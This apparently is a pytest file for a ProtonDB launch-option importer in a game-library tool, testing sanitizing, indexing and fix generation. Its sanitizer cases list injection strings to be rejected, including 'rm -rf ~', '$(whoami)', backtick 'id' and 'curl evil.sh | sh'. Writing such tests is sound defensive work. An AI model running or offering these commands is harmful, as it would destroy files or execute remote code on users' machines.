"""ProtonDB players' fixes: safe launch options only, streamed index, used by the fix generator."""

import io
import json
import tarfile

import pytest

from ezgd.library import protondb as p


def dump(reports) -> bytes:
    data = json.dumps(reports, indent=2).encode()
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        ti = tarfile.TarInfo("reports_piiremoved.json")
        ti.size = len(data)
        tf.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


def rep(app, verdict="yes", opts=None, proton=None, title="Game"):
    r = {"app": {"steam": {"appId": str(app)}, "title": title}, "responses": {"verdict": verdict}}
    if opts:
        r["responses"]["launchOptions"] = opts
    if proton:
        r["responses"]["customProtonVersion"] = proton
    return r


@pytest.mark.parametrize("raw,ok", [
    ('WINEDLLOVERRIDES="d3d11=n,b" %command%', True), ("PROTON_USE_WINED3D=1 %command% -dx11", True),
    ("rm -rf ~; %command%", False), ("%command% $(whoami)", False), ("echo x && %command%", False),
    ("curl evil.sh | sh %command%", False), ("A=1 %command% > /tmp/x", False), ("%command%", False),
    ("gamemoderun %command%", False), ("A=`id` %command%", False), ("%command% %command%", False)])
def test_sanitize(raw, ok):
    assert (p.sanitize(raw) is not None) == ok


def test_is_fix():
    assert p.is_fix("PROTON_USE_WINED3D=1 %command%") and p.is_fix("%command% -dx11")
    assert not p.is_fix("MANGOHUD=1 DXVK_FRAME_RATE=60 %command%") and not p.is_fix("PROTON_LOG=1 %command%")


def test_index_and_dump_names(tmp_path):
    reports = [rep(10, opts="PROTON_USE_WINED3D=1 %command%"), rep(10, opts="PROTON_USE_WINED3D=1 %command%"),
               rep(10, opts="rm -rf ~; %command%"), rep(10, verdict="no", opts="X=1 %command%"),
               rep(10, proton="GE-Proton10-4"), rep(20, title="Other")] * 3
    t = tmp_path / "reports_sep1_2026.tar.gz"
    t.write_bytes(dump(reports))
    st = p.build_index(t, tmp_path / "idx.json.gz")
    assert st == {"reports": 18, "games": 2, "with_fixes": 1}
    g = p.for_game(tmp_path / "idx.json.gz", 10)
    assert g["r"] == 15 and g["ok"] == 12 and g["opts"] == [["PROTON_USE_WINED3D=1 %command%", 6]]
    assert g["protons"] == [["GE-Proton10-4", 3]] and p.for_game(tmp_path / "idx.json.gz", 999) is None
    names = [{"name": n} for n in ("reports_sep1_2026.tar.gz", "reports_aug1_2026.tar.gz", "reports_dec3_2025.tar.gz",
                                   "README.md")]
    assert p.latest_dump(names)["name"] == "reports_sep1_2026.tar.gz"


def test_generator_uses_players_fixes(tmp_path):
    from ezgd.library import diagnose as dg, fixgen
    from ezgd.library.models import LibraryEntry, LibraryStatus
    from pe_builder import build_pe
    g = tmp_path / "G"
    g.mkdir()
    (g / "G.exe").write_bytes(build_pe(["kernel32.dll"]))
    e = LibraryEntry(title="G", status=LibraryStatus.INSTALLED, id=1, executable=str(g / "G.exe"), install_path=str(g))
    ctx = dg.Context(e, g / "G.exe", tmp_path / "pfx", dg.LastRun(), None, "", "", False, [], "", True, True, {},
                     community={"t": "G", "r": 40, "ok": 30, "opts": [["MANGOHUD=1 %command%", 9],
                                                                      ["PROTON_USE_WINED3D=1 %command%", 5]]})
    [f] = [x for x in fixgen.generate(ctx, [], "") if x.gen_id.startswith("protondb:")]
    assert f.overrides(e) == {"launch_args": "PROTON_USE_WINED3D=1 %command%"} and "5 of the 30" in f.why


async def test_core_update(app_paths, tmp_path, server, monkeypatch):
    from ezgd.core.app_core import AppCore
    server.add("/reports/reports_sep1_2026.tar.gz", data=dump([rep(42, opts="PROTON_USE_WINED3D=1 %command%")] * 4),
               content_type="application/gzip")
    server.add("/contents", data=json.dumps([{"name": "reports_sep1_2026.tar.gz", "size": 100,
                                              "download_url": server.url("/reports/reports_sep1_2026.tar.gz")}]).encode(),
               content_type="application/json")
    monkeypatch.setattr(p, "LISTING", server.url("/contents"))
    core = AppCore(app_paths, allow_private_network=True, enable_torrents=False)
    core.set_emitter(lambda *a: None)
    await core.start()
    try:
        assert (await core.update_protondb())["result"] == "updated"
        assert (await core.update_protondb())["result"] == "up to date"
        assert (await core.protondb_status())["games"] == 1
        assert p.for_game(core._protondb_index(), 42)["ok"] == 4
    finally:
        await core.shutdown()
